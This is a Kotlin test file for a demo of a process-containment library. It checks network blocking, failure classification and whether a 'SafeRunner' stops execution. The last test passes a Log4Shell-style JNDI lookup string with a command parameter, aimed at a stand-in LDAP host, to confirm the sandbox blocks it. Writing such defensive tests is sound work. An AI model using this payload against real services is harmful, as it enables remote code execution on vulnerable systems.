package demo

import io.mazewall.enforcer.api.EnabledIfLinuxAndSupported
import io.mazewall.enforcer.api.ContainmentViolationEvidence
import io.mazewall.enforcer.api.ContainmentViolationException
import io.mazewall.enforcer.diagnostics.ContainmentViolationDetector
import org.junit.jupiter.api.Test
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertTrue

class DemoAppTest {
    @Test
    fun `default all never invokes profiling`() {
        var profiles = 0
        val result = ScenarioResult("control", ExpectedResult.ALLOWED, ScenarioOutcome.Completed("ok"))
        val report = runDemo("all", { result }, { listOf(result) }, { profiles++; DemoReport(listOf(result)) })
        assertTrue(report.passed)
        assertEquals(0, profiles)
        runDemo("profile", { result }, { listOf(result) }, { profiles++; DemoReport(listOf(result)) })
        assertEquals(1, profiles)
    }

    @Test
    fun `setup failure produces infrastructure exit outcome`() {
        val report = runDemo("safe", safe = { throw java.io.IOException("fixture unavailable") })
        assertEquals(2, report.exitCode)
        assertTrue(report.results.single().outcome is ScenarioOutcome.InfrastructureFailure)
    }

    @Test
    @EnabledIfLinuxAndSupported
    fun `network control reaches loopback uncontained and is blocked with NO_NETWORK`() {
        io.mazewall.enforcer.api.IsolatedProcessTester.runIsolatedMethod(javaClass.name, "networkBody")
    }

    @Suppress("unused")
    fun networkBody() {
        val report = runNoNetwork()
        when (val outcome = report.outcome) {
            is ScenarioOutcome.Completed -> kotlin.test.fail(report.render())
            is ScenarioOutcome.Denied -> assertTrue(report.passed)
            is ScenarioOutcome.InfrastructureFailure -> {
                assertEquals(ContainmentViolationEvidence.INFERRED_PERMISSION_FAILURE,
                    ContainmentViolationDetector.diagnose(outcome.cause)?.evidence, report.render())
                assertFalse(report.passed)
            }
        }
    }

    @Test
    fun `inferred permission text is never claimed as authenticated containment`() {
        val inferred = java.io.IOException("Permission denied")

        assertTrue(classifyContainmentFailure(inferred) is ScenarioOutcome.InfrastructureFailure)
    }

    @Test
    @EnabledIfLinuxAndSupported
    fun `unsafe succeeds while safe requires authenticated containment evidence`() {
        assertTrue(runUnsafe().passed)
        val safe = runSafe()
        when (safe.outcome) {
            is ScenarioOutcome.Denied -> assertTrue(safe.passed)
            is ScenarioOutcome.InfrastructureFailure -> assertFalse(safe.passed)
            is ScenarioOutcome.Completed -> assertFalse(safe.passed)
        }
    }

    @Test
    @EnabledIfLinuxAndSupported
    fun `SafeRunner handles malformed payload`() {
        // This won't trigger the JNDI logic, so it's a simple success path
        SafeRunner.run("not-jndi")
    }

    @Test
    @EnabledIfLinuxAndSupported
    fun `SafeRunner blocks execution in JNDI`() {
        val failure = assertFailsWith<ContainmentViolationException> {
            SafeRunner.run($$"${jndi:ldap://test?cmd=ls}")
        }
        assertEquals(ContainmentViolationEvidence.INFERRED_PERMISSION_FAILURE, ContainmentViolationDetector.diagnose(failure)?.evidence)
    }
}
